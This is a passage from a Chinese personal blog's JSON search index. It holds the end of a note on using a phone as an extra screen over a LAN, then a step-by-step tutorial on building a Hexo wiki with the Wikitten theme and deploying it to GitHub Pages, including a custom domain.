软件安装完之后，主机和用于扩展屏幕的设备需处于同一局域网下，主机端打开软件，扩展端也打开软件，扩展端会直接在局域网内搜索主机，然后选中要使用扩展的主机即可 PS： Windows系统查看 IP 地址可通过 cmd 命令进行查询： 快捷键Windows + R打开运行 输入 cmd 敲击回车，弹出黑框框 输入ipconfig命令敲击回车，即可查询当前IP 注意：如果手机和电脑分辨率不一样会导致扩展屏的使用体验很糟糕！","tags":[],"categories":[{"name":"折腾笔记","slug":"折腾笔记","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"},{"name":"手机连接电脑","slug":"折腾笔记/手机连接电脑","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E8%BF%9E%E6%8E%A5%E7%94%B5%E8%84%91/"}]},{"title":"使用hexo搭建个人wiki","date":"2020-03-12T11:38:51.000Z","path":"wiki/折腾笔记/博客搭建/使用hexo搭建wiki/","text":"Hexo及其环境的安装安装Hexo需要Node.js和Git环境，Hexo安装方法和过程参考官方文档 初始化hexo文件夹：1$ hexo init &lt;floder_name&gt; 初始化完成后，文件夹结构如下： 12345678.├── _config.yml├── package.json├── scaffolds├── source| ├── _drafts| └── _posts└── themes 其中_config.yml为站点配置文件，themes为主题文件目录 hexo的快速入门创建新文章1$ hexo new \"My New Post\" More info: Writing 运行服务器1$ hexo server More info: Server 生成静态文件1$ hexo generate More info: Generating 部署到远程站点1$ hexo deploy More info: Deployment PS：Hexo建站各种基本使用方法请参考官方文档 Hexo安装Wikitten主题：PS:这里主题使用相关内容均来自Wikitten主题的文档 安装过程如下： 进入你的hexo文件夹，将主题克隆到themes/路径下 12$ cd your-hexo-directory$ git clone https://github.com/zthxxx/hexo-theme-Wikitten.git themes/Wikitten 覆盖站点目录中的默认页面模板 12$ cp -rf themes/Wikitten/_source/* source/$ cp -rf themes/Wikitten/_scaffolds/* scaffolds/ 重命名主题中的 _config.yml.example 到 _config.yml，然后可以使用配置文件配置主题 123$ cp -f themes/Wikitten/_config.yml.example themes/Wikitten/_config.yml# 编辑配置文件，定制你的配置项$ vim themes/Wikitten/_config.yml 安装插件 12345hexo-autonofollow // 打开非本站链接时自动开启新标签页hexo-directory-category // 根据文章文件目录自动为文章添加分类hexo-generator-feed // 生成 RSS 源hexo-generator-json-content // 生成全站文章 json 内容，用于全文搜索hexo-generator-sitemap // 生成全站站点地图 sitemap 安装命令： 1$ npm i -S hexo-autonofollow hexo-directory-category hexo-generator-feed hexo-generator-json-content hexo-generator-sitemap 到这里我们的个人wiki版的hexo站点已经可以运行了，接下来我们需要做一些定制化的配置： 添加插件的配置内容：向站点配置文件（hexo根目录下的_config.yml文件）最后添加如下内容 123456789101112131415161718192021222324252627282930313233## Markdown## https://github.com/hexojs/hexo-renderer-markedmarked: gfm: true ## Plugins: https://hexo.io/plugins/### JsonContentjsonContent: meta: false pages: title: true date: true path: true text: true posts: title: true date: true path: true text: true tags: true categories: true ignore: - 404.html ### Creat sitemapsitemap: path: sitemap.xml### Adds nofollow attribute to all external links in your hexo blog posts automatically.nofollow: enable: true exclude: - &lt;your site url domain&gt; # eg: zthxxx.me 到这里，我们的wikitten主题的hexo站点已经成功搭建完成 一些个人定制化配置（可选）修改代码块颜色这个主题启用之后，默认代码块的背景颜色是黑色，纯白色的背景配纯黑的代码块背景颜色有点看着不舒服，所以我想将代码块颜色进行修改。 找到主题配置文件找到如下行： 1highlight: monokai 将monokai改成自己想要的主题即可，本站使用的风格是`` PS：可用主题名称可于Wikitten/source/css/_highlight目录下找到，highlightjs网站可进行在线预览。 启用资源文件夹编写.md格式文档过程中，图片的插入是个问题，我们可以引用外部链接，也可以使用本地图片，如果不想使用远程图床的话，这里启用资源文件夹更加便于在文档中插入图片 在站点配置文件夹中，找到如下配置选项，将false改为true即可 1post_asset_folder: false 接下来使用命令(hexo new title)创建新文档的时候，就会自动创建一个资源文件夹 PS：由于之前开启了自动以文件夹来创建分类，所以我们使用资源文件夹的时候，文件夹里不要出现.md文件，不然文件夹也会被认为是一个文章分类 部署到Github Page手动部署这里有两个地方要操作，一个是github，一个是本地配置文件 github创建github page仓库 创建github账号 创建个人仓库，仓库名为用户名.github.io 配置部署到github 安装 hexo-deployer-git 1$ npm install hexo-deployer-git --save 编辑站点配置文件，找到如下内容： 1234# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: '' 按照如下格式进行修改： 1234deploy: type: git repo: &lt;repository url&gt; branch: master repo：github仓库的url（例如:https://github.com/username/username.github.io.git） branch：分支名称(一般是master) 然后使用如下命令进行部署 1$ hexo clean &amp;&amp; hexo g &amp;&amp; hexo d 命令执行完成后会提示你输入github账号密码，输入完即完成了提交 接下来可从username.github.io访问到自己的博客了 免密码部署设置 创建SSH密匙 1ssh-keygen -t rsa -C \"GitHub 邮箱\" 复制公钥（生成的.pub的文件）的内容到github–setting–SSH and GPG keys中（标题随便起） 修改站点配置文件，将前面我们的repo改成ssh地址，格式例如： 1234deploy: type: git repository: git@github.com:myname/myname.github.io.git branch: master 然后我们再次使用hexo d进行部署，就不再需要我们填写用户名和密码了 使用脚本一键部署每次部署都需要三条命令，过于麻烦，我们可以写个脚本将三条命令进行简化 以下脚本均放在站点主目录下 shell脚本 12#!/bin/bashhexo clean &amp;&amp; hexo g &amp;&amp; hexo d python脚本 12345#!/usr/bin/python3import osos.system('hexo clean')os.system('hexo g')os.system('hexo d') 设置自定义域名我们也可以使用我们自己的域名来访问我们的博客，首先，我们需要先注册一个域名（比如，可以去腾讯云注册） 然后在我们博客的github仓库设置自定义域名为我们想要访问解析的域名，同时在我们注册域名的地方设置CNAME解析地址为:username.github.io. 稍等片刻即可通过自定义域名访问博客了 不过这里会出现一个问题就是每次部署都会导致CNAME信息需要重新设置，这里我们需要在站点主目录的source目录下创建个CNAME文件，里面写上自己要解析的地址即可 自动化部署到Github Page 使用Travis CI 将 Hexo 博客部署到 GitHub Pages 上可实现自动化部署，只需要我们将站点文件push到github上，即可自动部署成博客 如果不希望自己的站点文件公开的话，还是建议使用上面的手动部署方法 详细教程请参考hexo相关文档 More info: deploy to github page 参考资料 Hexo-Theme-Wikitten中文文档 Hexo文档","tags":[],"categories":[{"name":"折腾笔记","slug":"折腾笔记","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"},{"name":"博客搭建","slug":"折腾笔记/博客搭建","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]}]}